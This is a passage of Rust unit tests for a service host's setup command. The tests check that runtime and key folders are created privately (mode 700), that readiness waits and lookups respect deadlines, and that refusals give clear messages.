/// were removed (a cleared cache; a container on its volumes again) makes them again and
/// continues, as the host does at its start.
#[test]
fn a_set_up_instance_continues_after_its_runtime_folders_are_gone() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap().join("b");
    for dir in [base.clone(), base.join("t")] {
        std::fs::create_dir(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    let paths = Paths::at(&base, base.join("t"), None).unwrap();
    let input = Input {
        version: 1,
        service: Service::Foreground,
        root: base.join("data"),
        credentials: None,
        listen: loopback(free_port()).unwrap(),
    };
    let platform = Platform {
        service: Box::new(Untouchable),
        disk: Box::new(org_platform::testing::FakeDiskEncryption(
            EncryptionState::On,
        )),
        credentials: CredentialDirectory::Unused,
    };
    let run = || {
        let request = Request {
            name: None,
            port: None,
            prompt: None,
            named_port_base: NAMED_PORT_BASE,
            program: PathBuf::from("/no-such-program"),
            env: Vec::new(),
            terminal: false,
            development_keys: None,
            configuration: Some(Configuration::from(input.clone())),
        };
        run_at(&paths, &platform, request, &mut Vec::new()).map(drop)
    };
    run().unwrap();
    std::fs::remove_dir_all(base.join("t/ao")).unwrap();
    run().unwrap();
    assert_eq!(std::fs::read_dir(base.join("t/ao")).unwrap().count(), 1);
}

/// X5 review, fourth round, P2-1: setup is ready only when the service answers with its
/// browser service running. A host whose web process is still starting is asked again; a
/// failure another program causes (its address held) ends the wait at once; and a browser
/// service that does not run by the deadline is said to be the reason.
#[test]
fn setup_is_ready_only_when_the_browser_service_runs() {
    let id = "01965d2e-8b1c-7c3a-9f00-0123456789ab";
    let status = |state: GatewayState| {
        serde_json::from_value::<InstanceStatusResult>(serde_json::json!({
            "instance_id": id,
            "mode": "registered",
            "gateway": {"state": match state {
                GatewayState::Running => "running",
                GatewayState::Failed => "failed",
                _ => "starting",
            }},
            "offices": {"total": 0, "active": 0, "failed": 0},
            "administrator": "absent",
        }))
        .unwrap()
    };
    let mut answers = vec![
        Err("no socket yet".to_owned()),
        Ok(status(GatewayState::Starting)),
        Ok(status(GatewayState::Failed)),
        Ok(status(GatewayState::Running)),
    ]
    .into_iter();
    let mut asked = 0;
    let found = wait_ready(
        || {
            asked += 1;
            answers.next().unwrap()
        },
        id,
        Duration::from_secs(10),
        || None,
    )
    .unwrap();
    assert_eq!(found.gateway.state, GatewayState::Running);
    assert_eq!(
        asked, 4,
        "a host whose browser service is not running is not ready"
    );
    // Held for a moment (by the failed child the host is reaping) is not another program's.
    let mut answers = vec![
        Ok(status(GatewayState::Failed)),
        Ok(status(GatewayState::Failed)),
        Ok(status(GatewayState::Running)),
    ]
    .into_iter();
    let held_now = std::cell::Cell::new(true);
    assert!(wait_ready(
        || answers.next().unwrap(),
        id,
        Duration::from_secs(10),
        || held_now.replace(false).then(|| "port held".to_owned()),
    )
    .is_ok());
    let started = Instant::now();
    let held = wait_ready(
        || Ok(status(GatewayState::Failed)),
        id,
        Duration::from_secs(10),
        || Some("port held".to_owned()),
    )
    .unwrap_err();
    assert_eq!(held, "port held");
    assert!(
        started.elapsed() >= HELD_FOR,
        "another program was named at once"
    );
    let late = wait_ready(
        || Ok(status(GatewayState::Starting)),
        id,
        Duration::from_millis(300),
        || None,
    )
    .unwrap_err();
    assert!(
        late.contains("its browser service did not start within")
            && late.contains("still starting"),
        "{late}"
    );
}

/// X5 review V-a and P3-1: a development build's registered service whose record names no
/// credential directory keeps its keys in its development key folder, so setup refuses
/// before anything is saved without one, or with one that is not an absolute path, and
/// makes it (mode 700) before it registers the service. A folder the data folder holds, or
/// one another program made open to others, is refused.
#[test]
fn a_development_build_needs_and_makes_its_development_key_folder() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap();
    let platform = |credentials| Platform {
        service: Box::new(Untouchable),
        disk: Box::new(org_platform::testing::FakeDiskEncryption(
            EncryptionState::On,
        )),
        credentials,
    };
    let input = |service, credentials: Option<PathBuf>| Input {
        version: 1,
        service,
        root: base.join("data"),
        credentials,
        listen: loopback(7420).unwrap(),
    };
    let unused = platform(CredentialDirectory::Unused);
    let registered = input(Service::Registered, None);
    let missing = development_keys(&registered, None, None, &unused).unwrap_err();
    assert!(
        missing.contains("ORG_OFFICE_DEV_KEY_DIR") && missing.ends_with("nothing was changed"),
        "{missing}"
    );
    let relative =
        development_keys(&registered, None, Some(Path::new("keys")), &unused).unwrap_err();
    assert!(relative.contains("not an absolute folder"), "{relative}");
    assert_eq!(
        development_keys(&registered, None, Some(&base.join("keys")), &unused),
        Ok(Some(base.join("keys")))
    );
    // Nothing is needed where the host does not use one.
    let below = platform(CredentialDirectory::Below(base.join("state")));
    for (input, platform) in [
        (input(Service::Foreground, None), &unused),
        (
            input(Service::Registered, Some(base.join("secrets"))),
            &unused,
        ),
        (input(Service::Registered, None), &below),
    ] {
        assert_eq!(development_keys(&input, None, None, platform), Ok(None));
    }
    // An instance reserved without a credential directory (by an earlier build) keeps its
    // keys in the folder, whatever this build would record; one reserved with one does not.
    assert!(development_keys(&registered, Some(false), None, &below).is_err());
    assert_eq!(
        development_keys(&registered, Some(true), None, &unused),
        Ok(None)
    );
    // Made private, whatever the mask, and kept as it is the next time.
    let keys = base.join("keys");
    development_folder(&keys, &base.join("data")).unwrap();
    assert_eq!(
        std::fs::metadata(&keys).unwrap().permissions().mode() & 0o7777,
        0o700
    );
    development_folder(&keys, &base.join("data")).unwrap();
    // The folders above it that are missing are made too, private.
    let deep = base.join("state/agentic-org/dev-keys");
    development_folder(&deep, &base.join("data")).unwrap();
    for made in [base.join("state"), base.join("state/agentic-org"), deep] {
        assert_eq!(
            std::fs::metadata(&made).unwrap().permissions().mode() & 0o7777,
            0o700,
            "{}",
            made.display()
        );
    }
    // Inside the data folder, or holding it, it is refused and not made.
    for (folder, root) in [
        (base.join("data/keys"), base.join("data")),
        (base.join("keys"), base.join("keys/data")),
    ] {
        let refused = development_folder(&folder, &root).unwrap_err();
        assert!(refused.contains("contain each other"), "{refused}");
    }
    assert!(!base.join("data/keys").exists());
    // A folder open to others, or a link in its place, is refused.
    let open = base.join("open");
    std::fs::create_dir(&open).unwrap();
    std::fs::set_permissions(&open, std::fs::Permissions::from_mode(0o755)).unwrap();
    assert!(development_folder(&open, &base.join("data"))
        .unwrap_err()
        .contains("mode 700"));
    std::os::unix::fs::symlink(&keys, base.join("link")).unwrap();
    assert!(development_folder(&base.join("link"), &base.join("data")).is_err());
    // The whole run refuses before anything is saved.
    let paths_base = base.join("b");
    for dir in [paths_base.clone(), paths_base.join("t")] {
        std::fs::create_dir(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    let paths = Paths::at(&paths_base, paths_base.join("t"), None).unwrap();
    let request = Request {
        name: None,
        port: Some(free_port()),
        prompt: None,
        named_port_base: NAMED_PORT_BASE,
        program: PathBuf::from("/no-such-program"),
        env: Vec::new(),
        terminal: false,
        development_keys: None,
        configuration: None,
    };
    let refused = run_at(&paths, &unused, request, &mut Vec::new()).unwrap_err();
    assert!(refused.contains("ORG_OFFICE_DEV_KEY_DIR"), "{refused}");
    assert!(
        Journal::snapshot(&paths_base, None).is_err(),
        "a record was saved"
    );
    assert!(
        !Registry::open(&paths.locator, &paths.user_temp)
            .unwrap()
            .reserved(None)
            .unwrap(),
        "an instance was reserved"
    );
}

/// X5 review, fourth round, P2-7: a reservation that refused says what the locator holds,
/// whatever step of it refused: a reservation saved before a later step failed is reported
/// with the way to continue.
#[test]
fn a_refused_reservation_says_what_the_locator_holds() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap().join("b");
    for dir in [base.clone(), base.join("t")] {
        std::fs::create_dir(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    let paths = Paths::at(&base, base.join("t"), None).unwrap();
    let registry = Registry::open(&paths.locator, &paths.user_temp).unwrap();
    let journal = Journal::open(&base, None).unwrap();
    let input = Input {
        version: 1,
        service: Service::Registered,
        root: base.join("data"),
        credentials: None,
        listen: loopback(7420).unwrap(),
    };
    let said =
        |file| refused_reservation("disk full".into(), &registry, &journal, file, None, &input);
    assert_eq!(said(false), "disk full");
    drop(registry.reserve(None, &input.root).unwrap());
    let interactive = said(false);
    assert!(
        interactive
            .starts_with("disk full; instance \"default\" stays reserved with the data folder")
            && interactive.ends_with("run setup again to continue"),
        "{interactive}"
    );
    journal
        .freeze(input.clone(), true, release_pin().unwrap())
        .unwrap();
    let from_file = said(true);
    assert!(
        from_file.contains("run setup again with a file that keeps both"),
        "{from_file}"
    );
    assert!(
        journal.read().unwrap().is_none(),
        "the file's record was kept"
    );
}

/// X5 review, fourth round, P2-3: the account's folders are made below a location outside
/// the home that exists (an `XDG_*` variable naming another folder), one folder at a time,
/// and never below one that others can write to.
#[test]
fn the_account_folders_are_made_below_an_existing_folder_outside_the_home() {
    let temp =
        tempfile::tempdir_in(org_platform::dirs::testing::disk_backed_temp().unwrap()).unwrap();
    let base = temp.path().canonicalize().unwrap();
    let home = base.join("home");
    let cache = base.join("cache");
    let shared = base.join("shared");
    for (dir, mode) in [(&home, 0o700), (&cache, 0o700), (&shared, 0o777)] {
        std::fs::create_dir(dir).unwrap();
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(mode)).unwrap();
    }
    make_folders(
        &home,
        &home,
        [
            cache.join("agentic-org/tmp"),
            shared.join("agentic-org/tmp"),
            home.join(".local/share"),
        ],
    );
    assert!(cache.join("agentic-org/tmp").is_dir());
    assert_eq!(
        std::fs::metadata(cache.join("agentic-org"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777,
        0o700
    );
    assert!(home.join(".local/share").is_dir());
    assert!(
        !shared.join("agentic-org").exists(),
        "made below a folder others can write to"
    );
}

/// X5 review, fourth round, P2-8: the wait for the service is bound by one deadline, from
/// the connect to the answer.
#[test]
fn a_service_that_never_answers_does_not_hold_the_command() {
    let started = Instant::now();
    let never = within(Duration::from_millis(200), || -> Result<(), String> {
        std::thread::sleep(Duration::from_secs(30));
        Ok(())
    })
    .unwrap_err();
    assert!(never.contains("did not answer within"), "{never}");
    assert!(started.elapsed() < Duration::from_secs(5));
    assert_eq!(within(Duration::from_secs(5), || Ok(7)), Ok(7));
}

/// X5 review, fourth round, P2-9 and F4: the lookup runs in a child process and only its
/// answer comes back: what `work` returns, its refusal, a child that does not end
/// and an identity that cannot be taken are all answers, and the child never returns into
/// the caller. (Without root the child keeps this process's identity.)
#[test]
fn the_lookup_runs_in_a_child_and_only_its_answer_comes_back() {
    let me = std::process::id();
    let pid: Result<u32, String> = in_child(|| Ok(()), || Ok(std::process::id()), LOOKUP_WITHIN);
    assert_ne!(pid.unwrap(), me, "the work ran in this process");
    assert_eq!(
        in_child(
            || Ok(()),
            || Err::<u32, _>("no record".into()),
            LOOKUP_WITHIN
        ),
        Err("no record".into())
    );
    assert_eq!(
        in_child(
            || Err("not that user".into()),
            || -> Result<u32, String> { panic!("ran") },
            LOOKUP_WITHIN
        ),
        Err("not that user".into())
    );
    let started = Instant::now();
    let slow = in_child(
        || Ok(()),
        || -> Result<u32, String> {
            std::thread::sleep(Duration::from_secs(30));
            Ok(1)
        },
        Duration::from_millis(300),
    )
    .unwrap_err();
    assert!(slow.contains("did not end within"), "{slow}");
    assert!(started.elapsed() < Duration::from_secs(5));
    // The process this test runs in is not root: becoming its own account changes nothing.
    assert_eq!(
        become_account(Account {
            uid: crate::home::euid(),
            gid: unsafe { libc::getegid() },
        }),
        Ok(())
    );
}

/// X5 review, fourth round, P2-10: an instance that has an administrator gets no link, and
/// the command says what to do instead, without claiming a password reset.
#[test]
fn a_reset_of_an_instance_with_an_administrator_says_where_to_sign_in() {
    let origin = org_host_control::listen::ListenOrigin::parse("http://127.0.0.1:7420").unwrap();
    let mut out = Vec::new();
    let refused = answer_reset(
        AdminLinkResult::AdministratorPresent,
        &origin,
        Some("lab"),
        &mut out,
    )
    .unwrap_err();
    assert_eq!(
        refused,
        "instance lab has an administrator, so no registration link is issued: sign in at \
         http://127.0.0.1:7420. Resetting a forgotten administrator password is not available yet"
    );
    assert!(out.is_empty());
}

/// X5 review F12: setup names this user by its account name, which `admin reset --user`
/// takes, and not by an environment variable a container does not set.
#[test]
fn this_user_is_named_by_its_account() {
    if let Some(name) = plain_account_name(crate::home::euid()) {
        assert_eq!(user_name(), name);
    }
}
